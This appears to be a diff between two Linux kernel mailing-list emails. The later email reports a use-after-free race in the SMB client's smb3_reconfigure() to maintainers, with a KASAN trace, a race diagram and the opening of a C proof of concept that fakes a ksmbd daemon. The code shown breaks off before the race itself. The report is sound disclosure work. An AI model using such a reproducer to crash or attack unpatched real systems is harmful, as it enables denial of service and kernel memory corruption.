@@ -1,39 +1,51 @@
-Received: from mout.web.de (mout.web.de [212.227.15.4])
+Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.48])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C45BE218EB1;
-	Fri, 12 Jun 2026 17:39:19 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=212.227.15.4
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 51080396572
+	for <kernel-janitors@vger.kernel.org>; Fri, 12 Jun 2026 22:14:31 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.48
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781285961; cv=none; b=KhoJuZ1P6qzU5m580+Jo483cIuVmsrAX+R3L5/2+8OJGVQaYw7GM92UW9ePd4jjg09fCykHvELYuctRB1jjOQC0GbpTp2OiFagUzAcZlTOjlmxiJZmnOvlNpwKyAnskEQvjVApc0K/MSH37mhSX/56oPuszcZz8rZc38Pq2mvf0=
+	t=1781302475; cv=none; b=hDDZ/4G6NcsLZdLqDCpWzskf16s4r5QwYKxFRT3QXsZuK4XT/AEs7Si6nK9S2h4NXUaj2S36/lIfmpdcsUQ9UISj/avi9s8ra2d/uiLNf1p9h7K8zCd86RyVNMZBkg/Gatcra1MsFx+rqbRYkaDdve+CHhacpbcDCbKgqINSZgE=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781285961; c=relaxed/simple;
-	bh=GcOQ1BfJCrdgO/Qxw1eoi9krlAY2ASEk2WTmZb3kce0=;
-	h=Message-ID:Date:MIME-Version:To:Cc:From:Subject:Content-Type; b=KRhSDbWtEtm3TrelYlJTd1mVN1UG6DwUFnRuN0e1Wff00WNBKZ1g4PAGgvGsxdc6GqGHyLkheFDEQ54b6c6bacNyIW/u1z9ptcT56gAGsfC+fWcXkLjSfcn/vswkXheMvJpMi4ekm1k+2Ghb58PutNls63HbBO8LKpwT4wMq+To=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=web.de; spf=pass smtp.mailfrom=web.de; dkim=pass (2048-bit key) header.d=web.de header.i=markus.elfring@web.de header.b=Bfp9qZmT; arc=none smtp.client-ip=212.227.15.4
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=web.de
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=web.de
+	s=arc-20240116; t=1781302475; c=relaxed/simple;
+	bh=NvPtLW2HrGiyO/DH/sTRYzn+3Jh7FFnGPkitmwWzGMA=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=lRukiFg1aW2hPJMAot2cRDCOGhvkYeeCobqIjbbq4ORpPlwJx2Qz2NnbPt30u/YszRygzIk20c4LRjXhBhu+fOw+kPW6zzhGlgNC0BHs6RL7OlJFG1gYNrS9Zrd0BZNCzeSFKTl/KNoX0fUBgHhIcgb7d/16ExYuiYhdTv3ALNg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=pncS6N8Q; arc=none smtp.client-ip=43.163.128.48
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=web.de header.i=markus.elfring@web.de header.b="Bfp9qZmT"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=web.de;
-	s=s29768273; t=1781285943; x=1781890743; i=markus.elfring@web.de;
-	bh=zHEy9j+ImtU6O38k+TlpUursi38ekE+uSX8COFEaDn4=;
-	h=X-UI-Sender-Class:Message-ID:Date:MIME-Version:To:Cc:From:
-	 Subject:Content-Type:Content-Transfer-Encoding:cc:
-	 content-transfer-encoding:content-type:date:from:message-id:
-	 mime-version:reply-to:subject:to;
-	b=Bfp9qZmTjrImdV1kBnx1nB6AYxiXekj2WODAWpJqMtN/Rj/ERCX2XeYmoJUeMSdt
-	 qXOJX9jTlk7Gfm0/5olBG/1pmZOGJJf/wIRGsZzq72dKToGMm/LsB+LSFxUqMYec8
-	 BM+l3B8nB/xw43+wtzG/0i7uN8OAQo2QG2OB48h1M0Pq5WG/w0IjvO1jfqvW9eJkM
-	 ODQJK1rfNHATf+VrIa7MIgiCcUkosr/YD8/KPeYlthtipxjpCTrBuAPeIjp5zZWAH
-	 eJJBy9jTXtqEkj+rz6OTA3IFD4C9IrrVzWYiyLtZ4cPK+tFKdPZJUOwwHm9GDEA15
-	 05KFCCdCVe72mDfFIA==
-X-UI-Sender-Class: 814a7b36-bfc1-4dae-8640-3722d8ec6cd6
-Received: from client.hidden.invalid by smtp.web.de (mrweb006
- [213.165.67.108]) with ESMTPSA (Nemesis) id 1MTfkf-1wdq5C2ezN-00Wzdt; Fri, 12
- Jun 2026 19:39:03 +0200
-Message-ID: <6e9c0200-9539-49e2-b667-eeb2b4906d45@web.de>
-Date: Fri, 12 Jun 2026 19:39:01 +0200
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="pncS6N8Q"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1781302469; bh=6/1x+8mhqzdjjTgVDRCHIu55wXbn2ozvgkE6BaiEBfs=;
+	h=Date:Subject:To:Cc:References:From:In-Reply-To;
+	b=pncS6N8QB/7LQ9Wrun5HeYXTBQbhAsYyqeKakMo03J+EsGhstSBkbE1UrQCDhZqrZ
+	 pR3wbPii4RY4yN0PK+1o48ucW8f5jE7LyfmU57FP7zGIUop2Aj3xcFLHQaYzTZMesu
+	 q4Ug9k4ZIJV5XLLdx2VcO8tqiri8zC5sTbHAYB/w=
+Received: from [192.168.1.102] ([218.106.117.236])
+	by newxmesmtplogicsvrsza73-0.qq.com (NewEsmtp) with SMTP
+	id 39B340D5; Sat, 13 Jun 2026 06:14:27 +0800
+X-QQ-mid: xmsmtpt1781302467tvcyf6h7k
+Message-ID: <tencent_EE4C708E8D6128756512BCFEC902C8388808@qq.com>
+X-QQ-XMAILINFO: OVFdYp27KdlJgAsd//FsMkM6pJPsPLR6GPbTNrdg94hjbcvEFMyOB531zuOCiV
+	 1nybzw4aO7bEcBEuyGjdhbp7eTIOteM5Q72iRa2SKxVOlQKBp79CeFG26hMHPwEMJJ/FquvIBvP1
+	 C/Tl8GZ0mzKRhvO0UAfX+6FbwvpdFNy4KbR32JPy+UZpcfz6FKbOV2Q8NcQhznEMRy/DlLUjwX8C
+	 8N3HhW2ZG060Tx43Aeu5cK+oD3Os/4HS1t3F4Lltbd6Acebb8XzEsbqcb8za5sq9Ke2/ej8nftj9
+	 FOmXjICcdfyuTKfNA8+070GPOWDdKHDo+CzipUSHSIkjHeYEAViMn2WjvfQtINtvJA06hpj6t+WM
+	 1aziPI4Ph9vcYGG6I4sFLcsWkFw4GHhiePxY14cbPQm3cfgSB5jIpxXZMmBUPNvsSY0docxjI/TA
+	 zU0nS+MQjjYyZEp0QFdEHa5H50/j9PyeYqkksJDxHUpseJ+VjpB7v548mStxLTk6K3NOPs/7gQ8N
+	 fVUzvu8Ob9Coryo2c7fE/DcpvftyPwDxzVkAezgW3vZHeus5N9OhsXI1S+tAtOI3XkqJv5vyvYUO
+	 dHJx34n9tKuj2l7iboZ4uKCLU2SnO1nJBqz0DBibjLO5R0I0AOpMR5QGBSPXIx/LUq4Q+CH8x3/f
+	 0h0TAnTjWImhtKtF9rbxzDQ+Hiys/n8zka6alWQ95CywLQI/aHcWDkFdOfKGfccjVCVqeVtsRtFk
+	 4oAskx69EOvB/3qiOxQOxOutRNfQGPdykhwmzNCuePQiq+n7DDHDeLYX8FBvmAxNkP2Pm9FrF0j6
+	 rn/o7kBSRmmbXztVggMHbsmY/XFxn3B1lgXIkcFY9ddUHy9CvXI6llvdk7szhDTJbOuO0QGFo6Np
+	 FfCTmoZDHj5+44pTs5UIvy7wAaN8SGfJykzBfX/4G3VNKhF9JJpUSxD0GrFYJChhrUdFHTBxwsRZ
+	 f95nIVzBjy4Mpo0UMjbyAkwAoH6w3mNyRfW0v25tUzY7Gtm6bw6Zyp/KtDzZoru7pm5mIfWMLZNR
+	 SBouTTbVtF35SPEpPwI+NGrHmoriBy63C0KZINHU5TF0THjt7a64piIs+BBiYpi9zOvqkEo0Tt/P
+	 od0aw4
+X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
+X-OQ-MSGID: <e91613d8-eeb8-4083-a97b-859014e544b4@qq.com>
+Date: Sat, 13 Jun 2026 06:14:27 +0800
 Precedence: bulk
 X-Mailing-List: kernel-janitors@vger.kernel.org
 List-Id: <kernel-janitors.vger.kernel.org>
@@ -41,137 +53,517 @@ List-Subscribe: <mailto:kernel-janitors+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:kernel-janitors+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 User-Agent: Mozilla Thunderbird
-Content-Language: en-GB, de-DE
-To: linux-cifs@vger.kernel.org, samba-technical@lists.samba.org,
- Bharath SM <bharathsm@microsoft.com>, Paulo Alcantara <pc@manguebit.org>,
+Subject: Re: [PATCH] smb: client: Use more common error handling code in
+ smb3_reconfigure()
+To: Markus Elfring <Markus.Elfring@web.de>, linux-cifs@vger.kernel.org,
+ samba-technical@lists.samba.org, Bharath SM <bharathsm@microsoft.com>,
+ Paulo Alcantara <pc@manguebit.org>,
  Ronnie Sahlberg <ronniesahlberg@gmail.com>,
  Shyam Prasad N <sprasad@microsoft.com>, Steve French <sfrench@samba.org>,
  Tom Talpey <tom@talpey.com>
-Cc: LKML <linux-kernel@vger.kernel.org>, kernel-janitors@vger.kernel.org,
- linux-fsdevel@vger.kernel.org, Alexander Viro <viro@zeniv.linux.org.uk>,
- David Howells <dhowells@redhat.com>
-From: Markus Elfring <Markus.Elfring@web.de>
-Subject: [PATCH] smb: client: Simplify conditional compilation in
- __cifs_do_create()
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-X-Provags-ID: V03:K1:kwUxKYWDZfnJVDE6Y/mtt6UUvy1AAK061xGl9srdQIOavb6kiyO
- F6lPqWflw91gfwXiuSuKXufBJcbGl21ZGakCFVedo7wMY4z3BI1A1O6Z47xFP+tYLdAqfL0
- W9DONSFAImDaN0wvT9veP0MZ0gop+GfyR3dX0m9647/IsNebZOxj/cgBboI1cL0w/JTTUQk
- LHBqxIXkGqjXq40CeJL/A==
-X-Spam-Flag: NO
-UI-OutboundReport: notjunk:1;M01:P0:wJ/l/f+oONQ=;CnTwiggq8IcGwQNzAaVXbnjdYd/
- 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
+Cc: LKML <linux-kernel@vger.kernel.org>, kernel-janitors@vger.kernel.org
+References: <328ba830-24f6-4358-b88f-9aec843ecf14@web.de>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <328ba830-24f6-4358-b88f-9aec843ecf14@web.de>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-From: Markus Elfring <elfring@users.sourceforge.net>
-Date: Fri, 12 Jun 2026 19:24:14 +0200
+Hi Markus,
 
-Move an opening curly bracket behind the preprocessor directive =E2=80=9C#=
-endif=E2=80=9D
-so that an =E2=80=9C#else=E2=80=9D branch can be omitted.
+On Thu, 11 Jun 2026 17:33:39 +0200, Markus Elfring wrote:
+ > Use an additional label so that a bit of exception handling can be better
+ > reused at the end of this function implementation.
 
-Signed-off-by: Markus Elfring <elfring@users.sourceforge.net>
-=2D--
- fs/smb/client/dir.c | 5 ++---
- 1 file changed, 2 insertions(+), 3 deletions(-)
+While this refactoring itself looks fine, I noticed a Sashiko review[1]
+pointing out a pre-existing use-after-free race in smb3_reconfigure()
+that affects the same code path.  I wrote a PoC to verify it and was
+able to trigger the bug reliably on a KASAN-enabled kernel.
 
-diff --git a/fs/smb/client/dir.c b/fs/smb/client/dir.c
-index 88a4a1787ff0..1e747e8c51e5 100644
-=2D-- a/fs/smb/client/dir.c
-+++ b/fs/smb/client/dir.c
-@@ -432,10 +432,9 @@ static int __cifs_do_create(struct inode *dir, struct=
- dentry *direntry,
- 	if (tcon->unix_ext)
- 		rc =3D cifs_get_inode_info_unix(&newinode, full_path, dir->i_sb,
- 					      xid);
--	else {
--#else
--	{
-+	else
- #endif /* CONFIG_CIFS_ALLOW_INSECURE_LEGACY */
-+	{
- 		/* TODO: Add support for calling POSIX query info here, but passing in =
-fid */
- 		rc =3D cifs_get_inode_info(&newinode, full_path, buf, dir->i_sb, xid, f=
-id);
- 		if (newinode) {
-=2D-=20
-2.54.0
+The problem is that smb3_reconfigure() modifies cifs_sb->ctx in place:
+smb3_cleanup_fs_context_contents() frees the dynamically allocated
+strings inside the active context and sets their pointers to NULL,
+then memcpy() restores them from old_ctx.  Concurrent readers of
+/proc/mounts do not hold the VFS s_umount lock, so they can access
+these strings while they are being freed or are temporarily NULL.
+
+My PoC races MS_REMOUNT calls against threads continuously reading
+/proc/mounts.  Within a few iterations this triggers:
+
+==================================================================
+BUG: KASAN: slab-use-after-free in kstrdup+0x89/0xf0
+Read of size 15 at addr ffff88810b75b1f0 by task poc/9956
+
+Call Trace:
+  <TASK>
+  dump_stack_lvl+0x116/0x1f0
+  print_report+0xf4/0x600
+  kasan_report+0xe0/0x110
+  kasan_check_range+0x100/0x1b0
+  __asan_memcpy+0x23/0x60
+  kstrdup+0x89/0xf0
+  cifs_show_devname+0xbc/0x1a0       <-- /proc/mounts reader
+  show_vfsmnt+0x154/0x3a0
+  seq_read_iter+0xb2a/0x12d0
+  vfs_read+0x8c4/0xcf0
+  ksys_read+0x12f/0x250
+  do_syscall_64+0x129/0x850
+  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+
+Allocated by task 9944:
+  kstrdup+0x56/0xf0
+  smb3_fs_context_dup+0x539/0xb20
+  smb3_reconfigure+0xf6f/0x2690     <-- remount allocation
+  reconfigure_super+0x455/0xb60
+  path_mount+0x1a3a/0x2390
+
+Freed by task 9944:
+  kfree+0x171/0x720
+  smb3_cleanup_fs_context_contents.part.0+0x1ae/0x560  <-- freed here
+  smb3_fs_context_free+0x49/0x60
+  put_fs_context+0x15a/0x9b0
+  path_mount+0xd5c/0x2390
+==================================================================
+
+The race window:
+
+   CPU 0 (remount)                        CPU 1 (/proc/mounts reader)
+   ===============                        ==========================
+   smb3_reconfigure()
+     smb3_cleanup_fs_context_contents()
+       kfree(cifs_sb->ctx->devname)       ...
+         ...                              cifs_show_devname()
+         ... kstrdup(cifs_sb->ctx->devname)
+         ...                                ^ UAF — memory already freed
+
+I wrote the following PoC to reproduce this reliably.  It starts a
+ksmbd IPC daemon, mounts a CIFS share, then races continuous remount
+calls against /proc/mounts readers.  The full PoC source follows.
+
+---8<--- poc.c ---
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/mount.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <errno.h>
+#include <signal.h>
+#include <pthread.h>
+#include <linux/netlink.h>
+#include <linux/genetlink.h>
+#include <netinet/in.h>
+
+#define SHARE_DIR "/tmp/smb_share"
+#define MOUNT_POINT "/tmp/cifs_mount"
+
+#define KSMBD_GENL_NAME "SMBD_GENL"
+#define KSMBD_GENL_VERSION 1
+#define KSMBD_EVENT_STARTING_UP 2
+#define KSMBD_EVENT_LOGIN_REQUEST 4
+#define KSMBD_EVENT_LOGIN_RESPONSE 5
+#define KSMBD_EVENT_SHARE_CONFIG_REQUEST 6
+#define KSMBD_EVENT_SHARE_CONFIG_RESPONSE 7
+#define KSMBD_EVENT_TREE_CONNECT_REQUEST 8
+#define KSMBD_EVENT_TREE_CONNECT_RESPONSE 9
+
+struct startup_req {
+     __u32 flags; __s32 signing; __s8 min_prot[16]; __s8 max_prot[16];
+     __s8 netbios_name[16]; __s8 work_group[64]; __s8 server_string[64];
+     __u16 tcp_port; __u16 ipc_timeout; __u32 deadtime; __u32 file_max;
+     __u32 smb2_max_write; __u32 smb2_max_read; __u32 smb2_max_trans;
+     __u32 share_fake_fscaps; __u32 sub_auth[3]; __u32 smb2_max_credits;
+     __u32 smbd_max_io_size; __u32 max_connections; __s8 
+bind_interfaces_only;
+     __u32 max_ip_connections; __s8 reserved[499]; __u32 ifc_list_sz; 
+__s8 payload[];
+} __attribute__((packed));
+
+struct login_req  { __u32 handle; __s8 account[48]; __u32 rsv[16]; };
+struct login_rsp  { __u32 handle; __u32 gid; __u32 uid; __s8 
+account[48]; __u16 status; __u16 hash_sz; __s8 hash[18]; __u32 rsv[16]; };
+struct share_req  { __u32 handle; __s8 share_name[64]; __u32 rsv[16]; };
+struct share_rsp  { __u32 handle; __u32 flags; __u16 create_mask; __u16 
+dir_mask; __u16 fcm; __u16 fdm; __u16 fuid; __u16 fgid; __s8 
+share_name[64]; __u32 rsv[111]; __u32 payload_sz; __u32 veto_list_sz; 
+__s8 payload[]; };
+struct tree_req   { __u32 handle; __u16 af; __u16 f; __u64 sid; __u64 
+cid; __s8 account[48]; __s8 share[64]; __s8 peer[64]; __u32 rsv[16]; };
+struct tree_rsp   { __u32 handle; __u16 status; __u16 conn_flags; __u32 
+rsv[16]; };
+
+#define MY_NLA_OK(nla, rem) ((rem) >= (int)sizeof(struct nlattr) && 
+(nla)->nla_len >= sizeof(struct nlattr) && (int)(nla)->nla_len <= (rem))
+#define MY_NLA_NEXT(nla, rem) ((rem) -= (((nla)->nla_len + 3) & ~3), 
+(struct nlattr *)((char *)(nla) + (((nla)->nla_len + 3) & ~3)))
+
+static volatile int stop_flag = 0;
+static volatile int crash_detected = 0;
+
+static int run_cmd(const char *cmd)
+{
+     int ret = system(cmd);
+     if (ret == -1) return -1;
+     if (WIFEXITED(ret) && WEXITSTATUS(ret) != 0) return WEXITSTATUS(ret);
+     return 0;
+}
+
+/*
+  * Minimal ksmbd IPC daemon via generic netlink — provides just enough
+  * of the SMBD_GENL protocol for the kernel CIFS client to mount and
+  * remount a share.
+  */
+static int daemon_ksmbd_ipc(void)
+{
+     int fd, family_id = -1, ret;
